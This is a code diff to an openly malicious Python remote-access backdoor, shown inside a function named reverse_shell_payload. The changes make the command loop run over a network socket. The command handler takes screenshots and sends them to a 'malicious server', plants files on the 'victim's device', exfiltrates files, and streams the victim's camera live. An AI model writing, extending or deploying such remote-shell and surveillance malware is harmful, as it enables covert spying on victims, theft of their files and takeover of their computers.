@@ -154,7 +154,7 @@ def reverse_shell_payload():
     s.send(banner.encode())
     while True:
         try:
-           cmd = input("~shell@backdoor ")
+           s.send("~shell@backdoor ")
            cmd = s.recv(1024).decode("utf-8").strip()
            if not cmd:
                continue
@@ -163,23 +163,23 @@ def reverse_shell_payload():
                continue
            if cmd.lower() == "screenshoot":
                if get_screenshot() == True:
-                   s.send(b"The screen shot has been sent to mailicous server")
+                   s.send(b"The screen shot has been sent to mailicous server\n")
                else:
-                   s.send(b"An issue check your code")
+                   s.send(b"An issue check your code\n")
                continue
            if cmd.lower().startswith("put-files"):
                 args_files = cmd.split()
                 if  put_files(args_files) == True:
-                   s.send(b"The files put on victim's device")
+                   s.send(b"The files put on victim's device\n")
                 else:
-                    s.send(b"An issue when put files")
+                    s.send(b"An issue when put files\n")
                 continue
            if cmd.startswith("send"):
                 args_files = cmd.split()
                 if get_files(args_files) == True:
                     s.send(b"Files have been sent to the server\n")
                 else:
-                    s.send(b"The files did't come to your server check the code")
+                    s.send(b"The files did't come to your server check the code\n")
                 continue
            if cmd.lower().startswith("cd"):
                 try:
@@ -192,7 +192,7 @@ def reverse_shell_payload():
                 continue
            if cmd.lower() == "start-camera-live":
                threading.Thread(target=watch_victim_live,daemon=True).start()
-               s.send(b"You are watching the victim for your mailicous server")
+               s.send(b"You are watching the victim for your mailicous server\n")
            if cmd.lower() == "exit":
                break
            else:
